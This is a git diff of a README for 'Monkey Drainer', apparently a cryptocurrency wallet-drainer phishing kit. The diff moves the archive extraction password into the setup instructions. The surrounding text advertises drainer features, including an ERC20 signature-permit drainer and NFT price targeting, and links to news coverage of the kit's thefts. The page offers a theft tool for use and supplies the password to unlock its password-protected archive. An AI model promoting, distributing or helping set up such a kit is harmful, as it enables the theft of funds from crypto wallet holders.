@@ -2,7 +2,7 @@
  ### 📩**Click here [cointelegraph](https://cointelegraph.com/news/phishing-scammer-monkey-drainer-has-pilfered-as-much-as-1m-in-ethereum) to read the artical about monkey drainer on cointelegraph.**
 ---
 ## 🔥 How to setup ? 
-extract the file with winrar and read the guide inside the folder.
+Extract the file with winrar and read the guide inside the folder 🔑 Pass- fU%Lw!@Monkey-s60G
 
 ### <center>❄️ Monkey Drainer™
 ![Preview](https://cdn.discordapp.com/attachments/1011077087630741647/1063552459986964500/ssnsn.png)
@@ -32,9 +32,6 @@ extract the file with winrar and read the guide inside the folder.
 ✅ - 100 ERC20 Signature Permit Drainer (Drains Multiple Signature Supported ERC20)
 
 ✅ - NFT Pricing Priority List (all big NFTS hardcoded price)
-
-
-🔑 Password to Extract the Archive - fU%Lw!@Monkey-s60G
 
 
 ## `🐧 Socials`
